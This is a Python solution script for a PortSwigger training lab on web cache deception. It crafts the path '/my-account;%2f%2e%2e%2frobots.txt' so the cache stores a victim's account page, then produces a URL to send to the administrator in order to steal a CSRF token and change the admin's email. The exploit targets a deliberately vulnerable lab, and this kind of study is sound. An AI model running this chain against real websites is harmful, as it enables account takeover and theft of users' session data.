"""
Lab 5: Exploiting exact-match cache rules for web cache deception
https://portswigger.net/web-security/web-cache-deception/lab-wcd-exploiting-exact-match-cache-rules
Difficulty: Expert

📝 No static-extension or static-directory rule exists — instead the
cache has a rule for the EXACT file name /robots.txt. Chain a delimiter
the origin ignores (';') with a normalization discrepancy the cache
resolves (%2f%2e%2e%2f) so the full crafted path still matches /robots.txt
exactly as far as the cache's rule-matcher is concerned, while the origin
serves the real sensitive page underneath.

Goal: change the administrator's email via a CSRF-style attack that
captures their CSRF token from the deceptively-cached page.
"""

from utils import get_session, cache_status, probe_delimiters, log, note

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Step 1: confirm there's no static-directory rule (changing")
    note("query junk under /resources/ should give a cache MISS each time).")
    r1 = s.get(f"{TARGET}/resources/x1")
    r2 = s.get(f"{TARGET}/resources/x2")
    log(f"X-Cache x1={cache_status(r1)!r}, x2={cache_status(r2)!r}")

    note("Step 2: confirm /robots.txt specifically IS cached (exact-match).")
    r3 = s.get(f"{TARGET}/robots.txt")
    r4 = s.get(f"{TARGET}/robots.txt")
    log(f"robots.txt X-Cache: first={cache_status(r3)!r}, "
        f"second={cache_status(r4)!r}")

    note("Step 3: confirm ';' is ignored by the origin as a path delimiter.")
    probe_delimiters(s, f"{TARGET}/my-account", suffix="abc", candidates=[";"])

    note("Step 4: chain it — /my-account;%2f%2e%2e%2frobots.txt should")
    note("serve the real account page (origin resolves the dot-segments")
    note("after the ';'), while the cache normalizes the same string down")
    note("to an exact match for /robots.txt.")
    exploit_path = "/my-account;%2f%2e%2e%2frobots.txt"
    r5 = s.get(f"{TARGET}{exploit_path}?cb=1")
    log(f"Status: {r5.status_code}, contains account info: "
        f"{'wiener' in r5.text or 'csrf' in r5.text.lower()}")

    exploit_url = f"{TARGET}{exploit_path}?wcd"
    log(f"Deliver this URL to the administrator victim: {exploit_url}")

    note("After the admin visits it, fetch the same URL to retrieve their")
    note("cached account page (with a valid CSRF token for their session)")
    note("— then use that token to submit a change-email CSRF request on")
    note("their behalf, same pattern as the CSRF module's attacks.")


if __name__ == "__main__":
    run()
